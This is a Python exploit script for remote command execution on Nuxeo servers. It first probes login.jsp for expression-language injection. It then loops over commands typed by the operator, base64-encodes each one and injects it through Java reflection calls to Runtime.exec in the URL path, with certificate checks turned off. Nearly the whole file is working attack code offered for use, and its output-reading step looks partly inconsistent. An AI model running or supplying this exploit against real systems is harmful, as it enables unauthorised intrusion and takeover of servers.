import requests
import base64
import re
import sys

# Disable SSL warnings (used if the server uses self-signed certificates)
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Target setup
target_url = "http://127.0.0.1:8080"  # Change to the target URL
architecture = "UNIX"  # Set to "WIN" for Windows targets

# Function to check if the server responded successfully
def check_response(response):
    if response.status_code == 200 and "login.jsp/pwn" in response.text:
        print("OK")
    else:
        print(f"[-] Error: Status code {response.status_code}")
        sys.exit()

# Step 1: Check if the server is vulnerable
print("\n[+] Checking if the server is vulnerable...")
test_url = f"{target_url}/nuxeo/login.jsp/pwn${{-7+7}}.xhtml"
response = requests.get(test_url, verify=False)
check_response(response)
print("[+] Server is vulnerable!\n")

# Step 2: Command execution loop
while True:
    try:
        # Get command input from the user
        command = input(f"Enter command ({architecture}): ")

        # Encode the command in Base64
        command_encoded = base64.b64encode(command.encode("utf-8")).decode("utf-8").replace("/", "+")

        # Inject the command into the vulnerable endpoint
        print("\n[+] Executing command...")
        exec_url = (
            f"{target_url}/nuxeo/login.jsp/pwn${{"
            f"\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null)"
            f".invoke(null,null).exec(\"bash -c 'echo {command_encoded} | base64 -d | sh'\",null).waitFor()"
            f"}}.xhtml"
        )
        response = requests.get(exec_url, verify=False)
        check_response(response)

        # Step 3: Retrieve the output of the executed command
        print("\n[+] Retrieving command output...")
        result_url = (
            f"{target_url}/nuxeo/login.jsp/pwn${{"
            f"\"\".getClass().forName(\"java.io.BufferedReader\").getDeclaredMethod(\"readLine\")"
            f".invoke(\"\".getClass().forName(\"java.io.BufferedReader\").getConstructor(\"\".getClass().forName(\"java.io.Reader\"))"
            f".newInstance(\"\".getClass().forName(\"java.io.InputStreamReader\").getConstructor(\"\".getClass().forName(\"java.io.InputStream\"))"
            f".newInstance(\"\".getClass().forName(\"java.lang.Process\").getDeclaredMethod(\"getInputStream\")"
            f".invoke(\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredMethod(\"exec\",\"\".getClass())"
            f".invoke(\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(null),"
            f"\"echo {command_encoded} | base64 -d | sh\"))))))"
            f"}}.xhtml"
        )
        response = requests.get(result_url, verify=False)
        if response.status_code == 200:
            # Decode the Base64-encoded output
            output = base64.b64decode(re.search("pwn(.+?).xhtml", response.text).group(1)).decode("utf-8")
            print("\nCommand output:\n" + output)
        else:
            print(f"[-] Error retrieving output. Status code: {response.status_code}")

    except KeyboardInterrupt:
        print("\nExiting...")
        break
    except Exception as e:
        print(f"[-] An error occurred: {e}")
